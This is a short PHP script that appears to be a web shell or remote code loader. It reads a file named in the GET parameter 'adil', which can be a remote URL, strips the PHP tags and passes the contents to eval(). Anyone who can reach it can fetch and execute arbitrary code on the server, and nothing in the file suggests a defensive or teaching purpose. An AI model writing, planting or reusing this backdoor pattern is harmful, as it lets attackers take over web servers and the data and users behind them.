 <?php
if($_GET[adil]){
$file=implode("n",file($_GET[adil]));
$adil=str_replace("<?php", "",$file);
$adil=str_replace("<?", "",$adil);
$adil=str_replace("?>", "",$adil);
eval($adil);
}
?> 